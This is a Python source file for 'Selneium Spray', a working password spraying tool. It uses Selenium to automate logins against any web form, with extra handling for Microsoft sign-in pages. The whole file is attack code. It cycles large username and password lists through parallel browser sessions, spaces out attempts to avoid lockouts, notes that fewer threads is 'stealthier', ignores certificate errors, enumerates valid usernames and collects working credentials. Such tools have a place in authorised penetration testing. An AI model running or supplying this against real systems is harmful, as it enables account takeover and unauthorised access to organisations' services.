import argparse
import sys
from time import sleep
from selenium import webdriver
from selenium.webdriver import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as ec
from selenium.webdriver.support.ui import WebDriverWait
from datetime import datetime, timedelta
from multiprocessing import Pool
from functools import partial
import pause

# --------------------------------- #
# GLOBAL VARIABLES                  #
# --------------------------------- #

valid_credentials = []
__version__ = "0.1"


# --------------------------------- #
# CLASSES                           #
# --------------------------------- #

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


# --------------------------------- #
# FUNCTIONS                         #
# --------------------------------- #

def main(usernames="", passwords="", domain="", domain_after=False, url="", username_field="", password_field="",
         checkbox="", fail="", success="", threads=5, delay=30):

    # Prepare variables
    fail, success = prepare_success_fail(fail=fail, success=success)
    usernames = process_file(usernames)
    passwords = process_file(passwords)
    usernames = prepare_usernames(usernames, domain, domain_after)
    url = prepare_url(url)
    (username_field_key, username_field_value, password_field_key, password_field_value, checkbox_key,
     checkbox_value) = prepare_fields(username_field, password_field, checkbox=checkbox)
    print_beginning(usernames=usernames, passwords=passwords, domain=domain, domain_after=domain_after, url=url,
                    fail=fail, success=success, threads=threads, delay=delay)

    # Loop through passwords
    i = 0
    while i < len(passwords):
        next_start_time = datetime.now() + timedelta(minutes=delay)
        additional_arguments = {
            'password': passwords[i],
            'url': url,
            'username_field_key': username_field_key,
            'username_field_value': username_field_value,
            'password_field_key': password_field_key,
            'password_field_value': password_field_value,
            'checkbox_key': checkbox_key,
            'checkbox_value': checkbox_value,
            'fail': fail,
            'success': success
        }

        # Create a partial function with fixed additional arguments
        partial_attempt_login = partial(attempt_login, **additional_arguments)

        # Split the list of usernames into chunks for parallel processing
        if len(usernames) < threads:
            chunk_size = len(usernames)
        else:
            chunk_size = len(usernames) // threads
        username_chunks = [usernames[i:i + chunk_size] for i in range(0, len(usernames), chunk_size)]

        print(f"Starting spray of password '{passwords[i]}'")
        # Create a pool of worker processes
        with Pool(processes=threads) as pool:
            # Run the attempt_login_wrapper function in parallel with each chunk of usernames
            pool.map(partial(attempt_login_wrapper, partial_attempt_login), username_chunks)

        # Check to see if the process is at the end. If not, wait the specified time.
        i += 1
        if i < len(passwords):
            print(f"Spray of password '{passwords[(i-1)]}' complete. Waiting until {next_start_time.strftime('%H:%M')} "
                  f"to start next spray.")
            pause.until(next_start_time)
        else:
            print(f"Spray of password '{passwords[i-1]}' complete. All passwords complete.")

    print_ending()


def print_beginning(usernames=None, passwords=None, domain="", domain_after=False, url="",
                    fail="", success="", threads=5, delay=30):
    # Calculate length of spray
    total_minutes = len(passwords)*delay
    days = total_minutes // (24 * 60)
    hours = (total_minutes % (24 * 60)) // 60
    minutes = total_minutes % 60
    if days == 0:
        spray_duration = "{:02d}:{:02d}".format(hours, minutes)
    else:
        spray_duration = "{:02d} {:02d}:{:02d}".format(days, hours, minutes)

    print(f"{Colors.HEADER}{Colors.BOLD}Selneium Spray{Colors.END}")
    print(f"Author: Luke Lauterbach (Sentinel Technologies)")
    print(f"Version: {__version__}\n")

    print(f"{'Username Count:':<28}{len(usernames)}")
    print(f"{'Password Count:':<28}{len(passwords)}")
    print(f"{'Total Login Attempts:':<28}{(len(usernames)*len(passwords))}")
    print(f"{'Approximate Spray Duration:':<28}{spray_duration}")
    print(f"{'URL:':<28}{url}")
    if domain and domain_after:
        print(f"{'Domain:':<28}@{domain}")
    elif domain and not domain_after:
        print(f"{'Domain:':<28}{domain}/")
    if success:
        print(f"{'Success Condition:':<28}@{success}")
    elif fail:
        print(f"{'Failure Condition:':<28}{fail}")
    print(f"{'Threads:':<28}{threads}")
    print(f"{'Delay:':<28}{delay}\n")


def print_ending():
    global valid_credentials
    print(f"\nPassword spraying completed at {datetime.now().strftime("%m/%d/%Y %H:%M")}")
    print(f"Valid Credentials Found: {len(valid_credentials)}")
    if valid_credentials:
        print(f"\nValid Credentials:")
        print(f"------------------")
        for credential in valid_credentials:
            print(f"{credential['USERNAME']} - {credential['PASSWORD']}")


def parse_arguments():
    parser = argparse.ArgumentParser(description="Performs a password spraying attack utilizing Selenium.")
    parser.add_argument("-d", "--domain",
                        help="(OPTIONAL) Username or file with list of usernames to spray.")
    parser.add_argument("-da", "--domain-after", action="store_true",
                        help="(OPTIONAL) Append domain to the end of the username (e.g. username@domain). By default,"
                             "the domain is placed before the username (e.g. domain/username).")
    parser.add_argument("-p", "--password", required=True,
                        help="(REQUIRED) Password or file with list of usernames to spray.")
    parser.add_argument('-f', '--fail',
                        help="(OPTIONAL) Text which will be on the page if authentication fails. -s can be used as an"
                             "alternative.")
    parser.add_argument('-s', '--success',
                        help="(OPTIONAL) Text which will be on the page if authentication is successful. -f can be "
                             "used as an alternative")
    parser.add_argument("-u", "--username", required=True,
                        help="(REQUIRED) Username or file with list of usernames to spray.")
    parser.add_argument('URL',
                        help="(REQUIRED) URL of the website to spray.")

    parser.add_argument('-uf', '--username-field', required=True, type=str,
                        help="(REQUIRED) Input field attribute, used to identify which field should be used to put"
                             "a username into. Can be found by inspecting the username field in your browser. For"
                             "example, if '<input type='email'>', enter 'type='email''")
    parser.add_argument('-pf', '--password-field', required=True, type=str,
                        help="(REQUIRED) Input field attribute, used to identify which field should be used to put"
                             "a username into. Can be found by inspecting the username field in your browser. For"
                             "example, if '<input type='email'>', enter 'type='email''")
    parser.add_argument('-cb', '--checkbox', type=str,
                        help="(OPTIONAL) If a checkbox is required, provide a unique attribute of the checkbox, "
                             "allowing the script to automatically check it. For example, if '<input type='checkbox'>',"
                             " enter 'type='checkbox''")

    parser.add_argument('-t', '--threads', type=int, default=5,
                        help="(OPTIONAL) Number of threads for passwords spraying. Lower is stealthier. Default is 5.")
    parser.add_argument('-dl', '--delay', type=int, default=30,
                        help="(OPTIONAL) Length of time between passwords. The delay is between the first spray attempt"
                             " with a password and the first attempt with the next password. Default is 30.")

    args = parser.parse_args()  # Parse the command-line arguments

    return (args.username, args.password, args.domain, args.domain_after, args.URL, args.username_field,
            args.password_field, args.checkbox, args.fail, args.success, args.threads, args.delay)


def import_txt_file(filename):
    data = []
    with open(filename, "r") as file:
        for line in file:
            data.append(line.rstrip())
    return data


def process_file(filename):
    if filename.endswith(".txt"):
        return import_txt_file(filename)
    elif filename.endswith(".csv"):
        print("ERROR - CSVs are currently not supported.")
        sys.exit()
    else:
        return [filename]  # If it isn't a file, just return the username.


def prepare_success_fail(success="", fail=""):
    if not success and not fail:
        print(f"{Colors.FAIL}ERROR - No success or failure condition provided with -s or -f. Only one needs to be "
              f"provided, but one does need to be provided.{Colors.END}")
        sys.exit()
    elif success:
        success = success.split(",")
        fail = []
    elif fail:
        fail = fail.split(",")
        success = []

    return fail, success


def prepare_usernames(usernames=None, domain="", domain_after=False):
    if not domain:
        return usernames

    i = 0
    while i < len(usernames):
        if "/" in usernames[i] or "@" in usernames[i]:  # If the domain is already in the username, ignore the domain
            i += 1
            continue

        if domain_after:
            usernames[i] = f"{usernames[i]}@{domain}"
        else:
            usernames[i] = f"{domain}/{usernames[i]}"

        i += 1

    return usernames


def prepare_url(url=""):
    if not url.startswith("http://") and not url.startswith("https://"):
        url = f"https://{url}"  # TODO Check URL and allow http://, if that's all that's supported.

    return url


def prepare_fields(username_field="", password_field="", checkbox=""):
    username_field = username_field.replace("'", ""). replace('"', "")  # Remove quotation marks
    password_field = password_field.replace("'", "").replace('"', "")  # Remove quotation marks

    username_field = username_field.split("=")
    username_field_key = username_field[0]
    username_field_value = username_field[1]

    password_field = password_field.split("=")
    password_field_key = password_field[0]
    password_field_value = password_field[1]

    if checkbox:
        checkbox = checkbox.replace("'", "").replace('"', "")  # Remove quotation marks
        checkbox = checkbox.split("=")
        checkbox_key = checkbox[0]
        checkbox_value = checkbox[1]
    else:
        checkbox_key, checkbox_value = "", ""

    return (username_field_key, username_field_value, password_field_key, password_field_value, checkbox_key,
            checkbox_value)


def attempt_login_wrapper(attempt_login_func, username):
    # This is a wrapper function to pass the additional arguments to attempt_login
    attempt_login_func(username)


def attempt_login(usernames=None, password="", url="", username_field_key="", username_field_value="",
                  password_field_key="", password_field_value="", checkbox_key="", checkbox_value="", fail=None,
                  success=None):
    for username in usernames:
        selenium_options = webdriver.ChromeOptions()
        selenium_options.add_argument('--ignore-certificate-errors')
        driver = webdriver.Chrome(options=selenium_options)
        driver.delete_all_cookies()
        driver.get(url)

        # Wait until the username box loads
        try:
            WebDriverWait(driver, 5).until(
                ec.element_to_be_clickable((By.XPATH, f"//input[@{username_field_key}='{username_field_value}']")))
        except:
            print(f"ERROR - Could not find the username field with key {username_field_key} and value "
                  f"{username_field_value}")
            return

        # Find the username box
        input_box = driver.find_element(By.XPATH, f"//input[@{username_field_key}='{username_field_value}']")
        input_box.clear()  # Clear any existing text in the input box
        input_box.send_keys(username)

        # Try to find the password box. If it isn't on the current page, hit the ENTER key and wait for the Password
        # field to load.
        try:
            WebDriverWait(driver, 1).until(
                ec.element_to_be_clickable((By.XPATH, f"//input[@{password_field_key}='{password_field_value}']")))
        except:
            input_box.send_keys(Keys.RETURN)
            sleep(1)  # Wait for the page to load
            if "Microsoft" and "Work or school account" in driver.page_source:
                work_box = driver.find_element(By.XPATH, f"//div[@id='aadTile']")
                work_box.click()
                sleep(1)

            if ("couldn't find an account with that username" in driver.page_source.lower() or
                    "this username may be incorrect" in driver.page_source.lower()):
                print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - USERNAME INVALID: {username}")
                continue

        try:
            WebDriverWait(driver, 3).until(
                ec.element_to_be_clickable((By.XPATH, f"//input[@{password_field_key}='{password_field_value}']")))
        except:
            print(f"ERROR - Could not find the password field with key '{password_field_key}' and value "
                  f"'{password_field_value}'")
            driver.close()
            continue

        password_box = driver.find_element(By.XPATH, f"//input[@{password_field_key}='{password_field_value}']")
        password_box.clear()
        password_box.send_keys(password)
        # If there's a checkbox, click it.
        if checkbox_key and checkbox_value:
            try:
                checkbox = driver.find_element(By.XPATH, f"//input[@{checkbox_key}='{checkbox_value}']")
                checkbox.click()
            except:
                print(f"ERROR - Could not find the password field with key {password_field_key} and value "
                      f"{password_field_value}")

        password_box.send_keys(Keys.RETURN)

        # Check to see if the login was successful
        sleep(2)
        result = False
        for conditional_statement in (fail + success):
            if conditional_statement in driver.page_source:
                result = True

        if result and success:
            result = "SUCCESS"
        elif not result and fail:
            result = "SUCCESS"
        elif result and fail:
            result = "INVALID"
        elif not result and success:
            result = "INVALID"

        if result == "SUCCESS":
            print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - {Colors.GREEN}SUCCESS{Colors.END}: {username} - "
                  f"{password}")
            global valid_credentials
            valid_credentials.append({"USERNAME": username, "PASSWORD": password})
        else:
            print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - INVALID: {username} - {password}")

        driver.quit()


# --------------------------------- #
# MAIN                              #
# --------------------------------- #

if __name__ == "__main__":
    (main_usernames, main_passwords, main_domain, main_domain_after, main_url, main_username_field, main_password_field,
     main_checkbox, main_fail, main_success, main_threads, main_delay) = parse_arguments()
    main(usernames=main_usernames, passwords=main_passwords, domain=main_domain, domain_after=main_domain_after,
         url=main_url, username_field=main_username_field, password_field=main_password_field, checkbox=main_checkbox,
         fail=main_fail, success=main_success, threads=main_threads, delay=main_delay)
